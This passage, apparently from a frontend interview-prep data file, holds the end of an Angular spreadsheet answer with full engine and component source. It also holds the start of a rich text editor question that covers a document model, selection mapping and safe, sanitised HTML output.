<strong style="color:#ffca28;">1. Engine first:</strong> <span style="color:#f0e2c8;">"Typed <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Value</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">CellError</code>, a framework-free <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createSheet</code>, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update</code> returning <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ order, cycle }</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Parser:</strong> <span style="color:#f0e2c8;">"Recursive descent per precedence level, a whitelist of functions, and errors as values."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Recalc:</strong> <span style="color:#f0e2c8;">"Dirty set via <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rdeps</code>, Kahn on that set, and leftovers marked <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">#CYCLE!</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Signals:</strong> <span style="color:#f0e2c8;">"A <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">version</code> signal read by <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code> rows, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">draft</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">selected</code> signals, and no <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">FormsModule</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Keyboard:</strong> <span style="color:#f0e2c8;">"Roving <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code>, Excel keys, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">stopPropagation</code> in the editor, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">afterNextRender</code> focus."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Would you put the engine in a service?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Yes, once several components share a sheet: an injectable that owns the engine and exposes a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">version</code> signal, with components reading through <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">computed</code>.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">effect</code> to recalculate?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Recalculation is a direct result of a commit, so it runs in the handler; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">effect</code> is for syncing with the outside world, not for deriving state.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you load a sheet from an API?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toSignal</code> of the request, then one <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">sheet.update(allCells)</code>; one batched update sorts all cells once.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Plain unit tests on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">parse</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">evaluate</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update</code> including cycles, then one TestBed test typing a formula and asserting cell text and status.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Version signal** | A signal bumped to say "re-read the store" |
| **Type guard** | A function whose \`true\` result narrows a type |
| **Errors as values** | Error objects that flow through formulas |
| **Kahn's algorithm** | Topological sort by in-degree |
| **afterNextRender** | Run once after the next render |

---
**Conclusion:** The Angular spreadsheet is a strictly typed, framework-free engine (safe parser, dependency maps, Kahn recalculation with built-in cycle detection) behind a \`version\` signal and a few \`computed\` views, with signals for the editing state and \`afterNextRender\` for focus. Both compilation modes produced the same verified output as React and Vue.`,
        files: {
          "/src/app/app.component.ts": `import { Component } from "@angular/core";
import { SpreadsheetComponent } from "./spreadsheet.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [SpreadsheetComponent],
  styles: [
    \`
      :host {
        display: block;
        min-height: 100vh;
        margin: 0;
        background: #0f1115;
        color: #e6e6e6;
        font-family: system-ui, sans-serif;
      }
      .page {
        max-width: 760px;
        margin: 0 auto;
        padding: 20px 16px;
      }
      :host ::ng-deep .ss-bar {
        display: flex;
        gap: 8px;
        margin-bottom: 8px;
      }
      :host ::ng-deep .ss-name {
        min-width: 44px;
        padding: 6px 8px;
        border: 1px solid #2c3340;
        border-radius: 6px;
        background: #171a21;
        text-align: center;
        font:
          600 13px ui-monospace,
          monospace;
      }
      :host ::ng-deep .ss-bar input {
        flex: 1;
        min-width: 0;
        padding: 6px 8px;
        border: 1px solid #2c3340;
        border-radius: 6px;
        background: #0f1115;
        color: #e6e6e6;
        font:
          13px ui-monospace,
          monospace;
      }
      :host ::ng-deep .ss-scroll {
        overflow-x: auto;
        border: 1px solid #2c3340;
        border-radius: 8px;
      }
      :host ::ng-deep table {
        border-collapse: collapse;
        width: 100%;
        min-width: 520px;
        font-size: 13px;
      }
      :host ::ng-deep th {
        background: #171a21;
        color: #8b949e;
        font-weight: 500;
        padding: 4px 6px;
        border: 1px solid #262c36;
      }
      :host ::ng-deep td {
        border: 1px solid #262c36;
        padding: 0 6px;
        height: 28px;
        min-width: 80px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        max-width: 120px;
        cursor: cell;
      }
      :host ::ng-deep td.num {
        text-align: right;
        font-variant-numeric: tabular-nums;
      }
      :host ::ng-deep td.err {
        color: #ff8a80;
      }
      :host ::ng-deep td.sel {
        outline: 2px solid #f9a825;
        outline-offset: -2px;
        background: #1c140a;
      }
      :host ::ng-deep td input {
        width: 100%;
        box-sizing: border-box;
        border: 0;
        background: #1c140a;
        color: #ffe0b2;
        font:
          13px ui-monospace,
          monospace;
        outline: none;
        padding: 4px 0;
      }
      :host ::ng-deep .ss-status {
        font-size: 13px;
        color: #9aa4b2;
      }
    \`,
  ],
  template: \`
    <main class="page">
      <h1 style="font-size: 18px">Budget</h1>
      <app-spreadsheet />
    </main>
  \`,
})
export class AppComponent {}
`,
          "/src/app/engine.ts": `// A tiny spreadsheet engine: tokenizer -> recursive-descent parser -> AST,
// a dependency graph, and recalculation in topological order. No eval().
export type CellError = { error: string };
export type Value = number | string | CellError;
type Node =
  | { t: "num"; v: number }
  | { t: "ref"; id: string }
  | { t: "range"; from: string; to: string }
  | { t: "bin"; op: string; l: Node; r: Node }
  | { t: "neg"; e: Node }
  | { t: "fn"; name: string; args: Node[] };
type Token = { t: string; v?: any };
export type Recalc = { order: string[]; cycle: string[] };

export const COLS = ["A", "B", "C", "D", "E"];
export const ROWS = 8;
const FUNCS: Record<string, (xs: number[]) => number | CellError> = {
  SUM: (xs) => xs.reduce((a, b) => a + b, 0),
  AVERAGE: (xs) =>
    xs.length ? xs.reduce((a, b) => a + b, 0) / xs.length : err("#DIV/0!"),
  MIN: (xs) => (xs.length ? Math.min(...xs) : 0),
  MAX: (xs) => (xs.length ? Math.max(...xs) : 0),
};

export const err = (code: string): CellError => ({ error: code });
export const isErr = (v: unknown): v is CellError =>
  v !== null && typeof v === "object" && "error" in v;
const isDigit = (c: string) => c >= "0" && c <= "9";
const isLetter = (c: string) => c >= "A" && c <= "Z";

// "B12" -> { c: 1, r: 11 }, or null when it is not a cell inside the grid.
export function splitRef(id: string): { c: number; r: number } | null {
  let i = 0;
  while (i < id.length && isLetter(id[i])) i++;
  const c = COLS.indexOf(id.slice(0, i)),
    r = Number(id.slice(i)) - 1;
  return i > 0 &&
    i < id.length &&
    c >= 0 &&
    Number.isInteger(r) &&
    r >= 0 &&
    r < ROWS
    ? { c, r }
    : null;
}

function tokenize(src: string): Token[] {
  const out: Token[] = [];
  let i = 0;
  while (i < src.length) {
    const ch = src[i];
    if (ch === " ") {
      i++;
      continue;
    }
    if (isDigit(ch) || ch === ".") {
      let j = i;
      while (j < src.length && (isDigit(src[j]) || src[j] === ".")) j++;
      const n = Number(src.slice(i, j));
      if (Number.isNaN(n)) throw err("#ERROR!");
      out.push({ t: "num", v: n });
      i = j;
      continue;
    }
    if (isLetter(ch.toUpperCase())) {
      let j = i;
      while (
        j < src.length &&
        (isLetter(src[j].toUpperCase()) || isDigit(src[j]))
      )
        j++;
      const word = src.slice(i, j).toUpperCase();
      out.push({ t: isDigit(word[word.length - 1]) ? "ref" : "name", v: word });
      i = j;
      continue;
    }
    if ("+-*/(),:".includes(ch)) {
      out.push({ t: ch });
      i++;
      continue;
    }
    throw err("#ERROR!");
  }
  return out;
}

// Grammar: expr := term (("+" | "-") term)* term := unary (("*" | "/") unary)*
// unary := "-" unary | atom atom := num | ref | ref ":"
// ref | name "(" args ")" | "(" expr ")"
export function parse(src: string): Node {
  const toks = tokenize(src);
  let p = 0;
  const peek = () => toks[p]?.t;
  const eat = (t: string) => {
    if (peek() !== t) throw err("#ERROR!");
    return toks[p++];
  };
  function expr(): Node {
    let node = term();
    while (peek() === "+" || peek() === "-")
      node = { t: "bin", op: toks[p++].t, l: node, r: term() };
    return node;
  }
  function term(): Node {
    let node = unary();
    while (peek() === "*" || peek() === "/")
      node = { t: "bin", op: toks[p++].t, l: node, r: unary() };
    return node;
  }
  function unary(): Node {
    if (peek() === "-") {
      p++;
      return { t: "neg", e: unary() };
    }
    if (peek() === "+") {
      p++;
      return unary();
    }
    return atom();
  }
  function atom(): Node {
    const tok = toks[p];
    if (!tok) throw err("#ERROR!");
    if (tok.t === "num") {
      p++;
      return { t: "num", v: tok.v };
    }
    if (tok.t === "ref") {
      p++;
      if (peek() === ":") {
        p++;
        return { t: "range", from: tok.v, to: eat("ref").v };
      }
      return { t: "ref", id: tok.v };
    }
    if (tok.t === "name") {
      p++;
      eat("(");
      const args: Node[] = [];
      if (peek() !== ")") {
        args.push(expr());
        while (peek() === ",") {
          p++;
          args.push(expr());
        }
      }
      eat(")");
      return { t: "fn", name: tok.v, args };
    }
    if (tok.t === "(") {
      p++;
      const e = expr();
      eat(")");
      return e;
    }
    throw err("#ERROR!");
  }
  const tree = expr();
  if (p !== toks.length) throw err("#ERROR!");
  return tree;
}

function expand(from: string, to: string): string[] | null {
  const a = splitRef(from),
    b = splitRef(to);
  if (!a || !b) return null;
  const ids: string[] = [];
  for (let c = Math.min(a.c, b.c); c <= Math.max(a.c, b.c); c++)
    for (let r = Math.min(a.r, b.r); r <= Math.max(a.r, b.r); r++)
      ids.push(COLS[c] + (r + 1));
  return ids;
}

function refsOf(node: Node, acc = new Set<string>()): Set<string> {
  if (node.t === "ref") acc.add(node.id);
  else if (node.t === "range")
    (expand(node.from, node.to) || []).forEach((id) => acc.add(id));
  else if (node.t === "bin") {
    refsOf(node.l, acc);
    refsOf(node.r, acc);
  } else if (node.t === "neg") refsOf(node.e, acc);
  else if (node.t === "fn") node.args.forEach((a) => refsOf(a, acc));
  return acc;
}

// Evaluate an AST. get(id) returns the
// current value of a cell. Errors propagate.
function evaluate(node: Node, get: (id: string) => Value): Value {
  const num = (v: Value): Value =>
    isErr(v) ? v : v === "" ? 0 : typeof v === "number" ? v : err("#VALUE!");
  switch (node.t) {
    case "num":
      return node.v;
    case "ref":
      return splitRef(node.id) ? num(get(node.id)) : err("#REF!");
    case "neg": {
      const v = evaluate(node.e, get);
      return isErr(v) || typeof v !== "number" ? v : -v;
    }
    case "bin": {
      const l = evaluate(node.l, get);
      if (isErr(l)) return l;
      const r = evaluate(node.r, get);
      if (isErr(r)) return r;
      if (typeof l !== "number" || typeof r !== "number") return err("#VALUE!");
      if (node.op === "/" && r === 0) return err("#DIV/0!");
      return node.op === "+"
        ? l + r
        : node.op === "-"
          ? l - r
          : node.op === "*"
            ? l * r
            : l / r;
    }
    case "range":
      return err("#VALUE!"); // a bare range only makes sense inside a function
    case "fn": {
      const fn = FUNCS[node.name];
      if (!fn) return err("#NAME?");
      const xs: number[] = [];
      for (const a of node.args) {
        if (a.t === "range") {
          const ids = expand(a.from, a.to);
          if (!ids) return err("#REF!");
          for (const id of ids) {
            const v = get(id);
            if (isErr(v)) return v;
            if (typeof v === "number") xs.push(v);
          } // text and blanks are skipped
        } else {
          const v = evaluate(a, get);
          if (isErr(v)) return v;
          if (typeof v === "number") xs.push(v);
        }
      }
      return fn(xs);
    }
  }
  return err("#ERROR!");
}

export function createSheet() {
  const raw = new Map<string, string>(),
    formula = new Map<string, Node | CellError>();
  const deps = new Map<string, Set<string>>(),
    rdeps = new Map<string, Set<string>>(),
    values = new Map<string, Value>();
  const get = (id: string): Value => values.get(id) ?? "";

  function setRaw(id: string, text: string) {
    // drop old edges
    for (const d of deps.get(id) || []) rdeps.get(d)?.delete(id);
    raw.set(id, text);
    let refs = new Set<string>();
    if (text.startsWith("=")) {
      try {
        const tree = parse(text.slice(1));
        formula.set(id, tree);
        refs = refsOf(tree);
      } catch (e) {
        formula.set(id, isErr(e) ? e : err("#ERROR!"));
      }
    } else formula.delete(id);
    deps.set(id, refs);
    for (const d of refs) {
      if (!rdeps.has(d)) rdeps.set(d, new Set());
      rdeps.get(d)!.add(id);
    }
  }

  function compute(id: string) {
    const f = formula.get(id),
      text = raw.get(id) || "";
    if (!f)
      values.set(
        id,
        text.trim() === ""
          ? ""
          : Number.isNaN(Number(text))
            ? text
            : Number(text),
      );
    else values.set(id, isErr(f) ? f : evaluate(f as Node, get));
  }

  // Apply edits, then recalculate only the edited
  // cells and everything downstream of them.
  // Returns the recalculation order, which is what the UI shows.
  function update(changes: Record<string, string>): Recalc {
    for (const [id, text] of Object.entries(changes)) setRaw(id, text);
    const dirty = new Set<string>(),
      stack = Object.keys(changes);
    while (stack.length) {
      const id = stack.pop()!;
      if (dirty.has(id)) continue;
      dirty.add(id);
      for (const d of rdeps.get(id) || []) stack.push(d);
    }
    // Kahn topological sort restricted to the dirty set.
    const indeg = new Map(
      [...dirty].map((id) => [
        id,
        [...(deps.get(id) || [])].filter((d) => dirty.has(d)).length,
      ]),
    );
    const queue = [...dirty].filter((id) => indeg.get(id) === 0).sort();
    const order: string[] = [];
    while (queue.length) {
      const id = queue.shift()!;
      order.push(id);
      compute(id);
      for (const d of [...(rdeps.get(id) || [])].sort()) {
        if (!dirty.has(d)) continue;
        indeg.set(d, indeg.get(d)! - 1);
        if (indeg.get(d) === 0) queue.push(d);
      }
    }
    // Whatever never reached in-degree 0 is on a cycle or downstream of one.
    const stuck = [...dirty].filter((id) => !order.includes(id)).sort();
    for (const id of stuck) values.set(id, err("#CYCLE!"));
    return { order, cycle: stuck };
  }

  return { update, get, raw: (id: string) => raw.get(id) || "" };
}

export function display(v: Value): string {
  if (isErr(v)) return v.error;
  // 0.1+0.2 shows 0.3
  if (typeof v === "number") return String(Number(v.toFixed(10)));
  return v;
}

export const SAMPLE: Record<string, string> = {
  A1: "Rent",
  B1: "1200",
  A2: "Food",
  B2: "450.50",
  A3: "Travel",
  B3: "180",
  A4: "Total",
  B4: "=SUM(B1:B3)",
  C1: "=B1/B4",
  D1: "=B1*12",
  A6: "Tax rate",
  B6: "0.2",
  B7: "=B4*B6",
  C4: "=MAX(B1:B3)-MIN(B1:B3)",
};
`,
          "/src/app/spreadsheet.component.ts": `import {
  Component,
  ElementRef,
  Injector,
  afterNextRender,
  computed,
  inject,
  signal,
} from "@angular/core";
import {
  COLS,
  ROWS,
  Recalc,
  SAMPLE,
  Value,
  createSheet,
  display,
  isErr,
  splitRef,
} from "./engine";

@Component({
  selector: "app-spreadsheet",
  standalone: true,
  template: \`
    <div class="ss">
      <div class="ss-bar">
        <span class="ss-name" aria-label="Selected cell">{{ selected() }}</span>
        <input
          aria-label="Formula bar"
          data-testid="bar"
          [value]="barValue()"
          (input)="onBarInput($event)"
          (keydown)="onBarKey($event)"
        />
      </div>
      <div class="ss-scroll">
        <table role="grid" aria-label="Spreadsheet">
          <thead>
            <tr>
              <th aria-hidden="true"></th>
              @for (c of cols; track c) {
                <th scope="col">{{ c }}</th>
              }
            </tr>
          </thead>
          <tbody>
            @for (row of rows(); track $index; let i = $index) {
              <tr>
                <th scope="row">{{ i + 1 }}</th>
                @for (cell of row; track cell.id) {
                  <td
                    [attr.data-cell]="cell.id"
                    [attr.tabindex]="cell.id === selected() ? 0 : -1"
                    [attr.aria-selected]="cell.id === selected()"
                    [class.sel]="cell.id === selected()"
                    [class.err]="isErr(cell.v)"
                    [class.num]="isNum(cell.v)"
                    (mousedown)="onCellDown(cell.id)"
                    (dblclick)="startEdit(sheet.raw(cell.id))"
                    (keydown)="onCellKey($event)"
                  >
                    @if (editingHere(cell.id)) {
                      <input
                        [attr.aria-label]="'Edit ' + cell.id"
                        [value]="draft()"
                        (input)="draft.set(val($event))"
                        (keydown)="onEditorKey($event)"
                      />
                    } @else {
                      {{ display(cell.v) }}
                    }
                  </td>
                }
              </tr>
            }
          </tbody>
        </table>
      </div>
      <p class="ss-status" role="status" data-testid="status">{{ status() }}</p>
    </div>
  \`,
})
export class SpreadsheetComponent {
  private host = inject(ElementRef);
  private injector = inject(Injector);
  readonly cols = COLS;
  readonly display = display;
  readonly isErr = isErr;
  isNum = (v: Value) => typeof v === "number";
  val = (e: Event) => (e.target as HTMLInputElement).value;

  // The engine is a plain mutable object; the
  // version signal tells Angular when to re-read it.
  readonly sheet = createSheet();
  private version = signal(0);
  selected = signal("A1");
  draft = signal<string | null>(null); // null = not editing
  editIn = signal<"cell" | "bar">("cell");
  last = signal<Recalc | null>(null);

  constructor() {
    this.sheet.update(SAMPLE);
  }

  rows = computed(() => {
    this.version(); // dependency: re-run after every commit
    return Array.from({ length: ROWS }, (_, r) =>
      COLS.map((c) => ({ id: c + (r + 1), v: this.sheet.get(c + (r + 1)) })),
    );
  });
  barValue = computed(() => {
    this.version();
    const d = this.draft();
    return d !== null ? d : this.sheet.raw(this.selected());
  });
  status = computed(() => {
    const l = this.last();
    if (!l) return "Edit a cell. Formulas start with =, e.g. =SUM(B1:B3).";
    return l.cycle.length
      ? \`Circular reference: \${l.cycle.join(", ")}\`
      : \`Recalculated: \${l.order.join(" → ")}\`;
  });
  editingHere = (id: string) =>
    id === this.selected() && this.draft() !== null && this.editIn() === "cell";

  private focusLater() {
    afterNextRender(
      () => {
        const sel =
          this.draft() !== null && this.editIn() === "cell"
            ? "td input"
            : 'td[tabindex="0"]';
        this.host.nativeElement.querySelector(sel)?.focus();
      },
      { injector: this.injector },
    );
  }
  commit(text: string) {
    this.last.set(this.sheet.update({ [this.selected()]: text }));
    this.version.update((v) => v + 1);
    this.draft.set(null);
  }
  select(id: string) {
    this.selected.set(id);
    this.focusLater();
  }
  move(dc: number, dr: number) {
    const { c, r } = splitRef(this.selected())!;
    const nc = Math.min(COLS.length - 1, Math.max(0, c + dc)),
      nr = Math.min(ROWS - 1, Math.max(0, r + dr));
    this.select(COLS[nc] + (nr + 1));
  }
  startEdit(text: string) {
    this.draft.set(text);
    this.editIn.set("cell");
    this.focusLater();
  }

  onCellKey(e: KeyboardEvent) {
    // the editor handles its own keys
    if (this.editingHere(this.selected())) return;
    const arrows: Record<string, [number, number]> = {
      ArrowUp: [0, -1],
      ArrowDown: [0, 1],
      ArrowLeft: [-1, 0],
      ArrowRight: [1, 0],
    };
    if (arrows[e.key]) {
      e.preventDefault();
      this.move(...arrows[e.key]);
    } else if (e.key === "Enter" || e.key === "F2") {
      e.preventDefault();
      this.startEdit(this.sheet.raw(this.selected()));
    } else if (e.key === "Delete" || e.key === "Backspace") {
      e.preventDefault();
      this.commit("");
    } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
      e.preventDefault();
      this.startEdit(e.key);
    }
  }
  onEditorKey(e: KeyboardEvent) {
    e.stopPropagation();
    const d = this.draft() ?? "";
    if (e.key === "Enter") {
      e.preventDefault();
      this.commit(d);
      this.move(0, 1);
    } else if (e.key === "Tab") {
      e.preventDefault();
      this.commit(d);
      this.move(e.shiftKey ? -1 : 1, 0);
    } else if (e.key === "Escape") {
      e.preventDefault();
      this.draft.set(null);
      this.select(this.selected());
    }
  }
  onBarInput(e: Event) {
    this.draft.set(this.val(e));
    this.editIn.set("bar");
  }
  onBarKey(e: KeyboardEvent) {
    const d = this.draft();
    if (e.key === "Enter" && d !== null) {
      e.preventDefault();
      this.commit(d);
    } else if (e.key === "Escape") {
      e.preventDefault();
      this.draft.set(null);
    }
  }
  onCellDown(id: string) {
    const d = this.draft();
    // clicking away commits
    if (d !== null && id !== this.selected()) this.commit(d);
    this.select(id);
  }
}
`,
        },
      },
    },
  },
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a basic Rich Text Editor",
    seoDescription: "Build a rich text editor without execCommand in React, Vue and Angular: a small document model, Selection and Range mapping, safe paste and a11y.",
    description: `**Question presented to candidate:**
"Build a basic rich text editor for release notes: a toolbar with Bold, Italic, Underline, a bulleted list and a numbered list, plus Ctrl+B, Ctrl+I and Ctrl+U. Do not use \`document.execCommand\`, and the HTML it produces must be safe to store and show to other users."

**Requirements:**
- A \`contenteditable\` area that starts with a few paragraphs, and a toolbar whose buttons show \`aria-pressed\` for the current selection.
- Bold, Italic and Underline toggle on the selection; with only a caret, they format the word the caret is in.
- A selection that is partly bold becomes fully bold; toggling again removes bold.
- List buttons turn the selected blocks into list items, switch between list types, and turn them back into paragraphs.
- The selection survives every command, and clicking a toolbar button does not steal it.
- Paste inserts plain text only. The editor emits normalised HTML that contains only \`p\`, \`ul\`, \`ol\`, \`li\`, \`strong\`, \`em\`, \`u\` and \`br\`.

**What a strong answer should cover:**
- Why \`execCommand\` is out: deprecated, inconsistent output across browsers, and no control over the markup.
- A small document model (blocks of text runs with marks) with pure commands, and a parse step from the DOM and a render step back to HTML.
- Mapping the DOM selection to model positions (block index and character offset) and restoring it after re-rendering.
- Not letting the framework render children into the editable element, so typing and framework patches do not fight.
- Sanitising by construction: parse keeps only known tags, and paste is plain text.

**Clarifying questions expected:**
- "Which formats are needed, and is nesting such as lists inside lists in scope?"
- "Should paste keep formatting from Word or Google Docs, or is plain text acceptable?"
- "Do we need undo and redo beyond what the browser gives us?"

**Code / implementation expected:** Yes. The model, the commands and selection mapping, and the toolbar UI.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** React developers preparing for a machine coding round who have used \`useRef\` and \`useEffect\` but have never built an editor.
**Difficulty:** Hard

> **How to read this doc:** Every idea is explained in plain words first, then tagged with a <code>📌 Interview term:</code> callout giving the vocabulary an interviewer expects. Anything marked "Verified" was printed by the real code: React 19 in StrictMode in jsdom, driven by a script, and the same component in headless Chromium 141 with real typing, Shift+Arrow selection and real toolbar clicks.

## 1. Why This Even Matters — A Story First

Picture a shared notebook where anyone can write and anyone can circle words and ask the class secretary to make them bold. If the secretary just scribbles over the page, the notebook soon holds three kinds of bold, stray colours copied from other notebooks, and one page that somehow runs a script when you open it. A sensible secretary does something else: reads the page into a tidy list ("this sentence, this part bold"), changes the list, and copies it back out neatly in one approved handwriting.

That is the whole design. The browser gives you \`contenteditable\`, which handles typing, the caret and IME input well. Formatting is where you take control: read the DOM into a small **document model**, apply a pure command, write normalised HTML back, and put the selection back where the user left it.

The old shortcut, \`document.execCommand("bold")\`, is what most tutorials still use. MDN marks it deprecated, browsers disagree on the markup it produces (\`<b>\` or \`<strong>\` or a styled \`<span>\`), and it is simply not there in jsdom (\`typeof document.execCommand\` printed \`undefined\`), so it cannot be unit-tested without a browser. MDN does note one real advantage: changes made through it stay on the browser undo stack, while direct DOM changes do not. The follow-ups cover that.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Which formats are required? | Here: bold, italic, underline, bulleted and numbered lists. Links, headings and nesting change the model. |
| What happens with only a caret? | Google Docs formats the whole word; others toggle a "pending" mark for the next typed text. This build formats the word. |
| Paste: keep formatting or plain text? | Keeping it means a real sanitiser. Plain text is safe by construction. |
| Where does the HTML go? | If other users will see it, the output must be an allow-list of tags with no attributes. |
| Undo and redo? | Programmatic DOM changes are not on the browser undo stack, so real undo needs its own history. |
| Collaboration? | Two people editing at once needs operational transforms or CRDTs, which is a different question. |

## 3. Requirements and Plan

- A \`contenteditable\` with three starting paragraphs.
- A toolbar with B, I, U, bulleted list and numbered list. Each button shows \`aria-pressed\` for the current selection and keeps the editor selection when clicked.
- Shortcuts: Ctrl+B, Ctrl+I and Ctrl+U (Cmd on a Mac).
- Paste as plain text.
- An \`onChange(html)\` callback with clean HTML.

| Piece | Where it lives | Why |
| :--- | :--- | :--- |
| The editable DOM | A \`ref\`; React renders **no children** into it | The browser owns typing; React re-rendering children would fight the caret. |
| Document model | Built on demand by \`parse(root)\` | Always derived from the DOM, so it never drifts from what the user typed. |
| Commands | Pure functions: \`toggleMark\`, \`toggleList\` | Model in, model out: testable with no DOM. |
| Toolbar state | \`useState({ b, i, u, block })\` | Recomputed on \`selectionchange\`, \`input\`, \`keyup\` and \`mouseup\`. |

📌 **Interview term: Document model** — a plain data structure describing the content, independent of how the browser stores it. Here: \`block = { type: "p" | "ul" | "ol", runs: [{ text, b, i, u }] }\`. A **run** is a stretch of text that has one set of marks.

<svg class="iq-diagram" width="100%" viewBox="0 0 720 230" role="img" aria-label="Command pipeline: the DOM and the Selection are read into a model and model positions, a pure command changes the model, the model is rendered to normalised HTML, and the selection is written back from the saved positions">
  <defs>
    <marker id="rte5r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="10" y="30" width="150" height="60" rx="10"/>
  <text class="d-text" x="85" y="55" text-anchor="middle">DOM</text>
  <text class="d-sub" x="85" y="75" text-anchor="middle">contenteditable</text>
  <rect class="d-box" x="210" y="30" width="150" height="60" rx="10"/>
  <text class="d-text" x="285" y="55" text-anchor="middle">parse</text>
  <text class="d-sub" x="285" y="75" text-anchor="middle">blocks of runs</text>
  <rect class="d-box-accent" x="410" y="30" width="150" height="60" rx="10"/>
  <text class="d-text d-accent" x="485" y="55" text-anchor="middle">command</text>
  <text class="d-sub" x="485" y="75" text-anchor="middle">pure function</text>
  <rect class="d-box" x="410" y="150" width="150" height="60" rx="10"/>
  <text class="d-text" x="485" y="175" text-anchor="middle">render</text>
  <text class="d-sub" x="485" y="195" text-anchor="middle">allow-listed HTML</text>
  <rect class="d-box-muted" x="10" y="150" width="150" height="60" rx="10"/>
  <text class="d-text" x="85" y="175" text-anchor="middle">Selection</text>
  <text class="d-sub" x="85" y="195" text-anchor="middle">block and offset</text>
  <rect class="d-box" x="210" y="150" width="150" height="60" rx="10"/>
  <text class="d-text" x="285" y="175" text-anchor="middle">restore</text>
  <text class="d-sub" x="285" y="195" text-anchor="middle">writeSelection</text>
  <path class="d-edge-accent" d="M 160 60 L 206 60" marker-end="url(#rte5r-arrow)"/>
  <path class="d-edge-accent" d="M 360 60 L 406 60" marker-end="url(#rte5r-arrow)"/>
  <path class="d-edge-accent" d="M 485 90 L 485 146" marker-end="url(#rte5r-arrow)"/>
  <path class="d-edge-accent" d="M 410 180 L 364 180" marker-end="url(#rte5r-arrow)"/>
  <path class="d-edge" d="M 85 150 L 85 94" marker-end="url(#rte5r-arrow)"/>
</svg>

Every command runs this loop once. Typing never does: between commands the browser edits the DOM directly, and the next command reads whatever is there.

## 4. Build It Step by Step

### 4.1 Parse: DOM to model, keeping only what you know

\`\`\`js
const MARK_TAGS = { STRONG: "b", B: "b", EM: "i", I: "i", U: "u" };

export function parse(root) {
  const blocks = [];
  const inline = (node, marks, runs) => {
    if (node.nodeType === 3) {
